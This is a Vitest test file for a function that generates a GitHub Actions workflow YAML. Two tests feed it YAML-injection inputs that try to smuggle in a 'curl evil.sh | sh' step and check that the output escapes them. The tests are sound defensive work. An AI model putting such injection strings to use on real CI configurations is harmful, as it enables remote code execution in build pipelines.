import { describe, expect, it } from 'vitest';
import { workflowYaml } from '@concord/shared';

describe('workflowYaml', () => {
  it('writes the Concord URL as a quoted string', () => {
    const yaml = workflowYaml('https://standards-concord.vercel.app');
    expect(yaml).toContain('concord-url: "https://standards-concord.vercel.app"');
    expect(yaml).toContain('token: ${{ secrets.CONCORD_APP_TOKEN }}');
    // GitHub vouches for the run, so autopilot can trust it.
    expect(yaml).toMatch(/^      id-token: write/m);
  });

  it('can’t be made to add keys or steps', () => {
    const plain = workflowYaml('https://example.org');
    const hostile = workflowYaml('https://example.org"\n      - run: curl evil.sh | sh\n#');
    // Same lines, and the hostile text stays inside one quoted, escaped scalar.
    expect(hostile.split('\n')).toHaveLength(plain.split('\n').length);
    const line = hostile.split('\n').find((l) => l.includes('concord-url'))!;
    expect(line).toBe(`          concord-url: ${JSON.stringify('https://example.org"\n      - run: curl evil.sh | sh\n#')}`);
    expect(hostile).not.toMatch(/^\s*- run: curl/m);
  });

  it('connected through the GitHub App, it has no secret and names the app instead', () => {
    const yaml = workflowYaml('https://standards-concord.vercel.app', { app: 'app_123' });
    expect(yaml).toContain('          app: "app_123"');
    expect(yaml).not.toContain('secrets.');
    expect(yaml).not.toMatch(/^\s*token:/m);
    // Concord starts runs itself, so the schedule is a daily backstop, and the run signs in with GitHub's token.
    expect(yaml).toContain("cron: '17 6 * * *'");
    expect(yaml).toMatch(/^      id-token: write/m);
    // The app id can't add keys or steps either.
    const hostile = workflowYaml('https://example.org', { app: 'x"\n      - run: curl evil.sh | sh' });
    expect(hostile).not.toMatch(/^\s*- run: curl/m);
  });
});
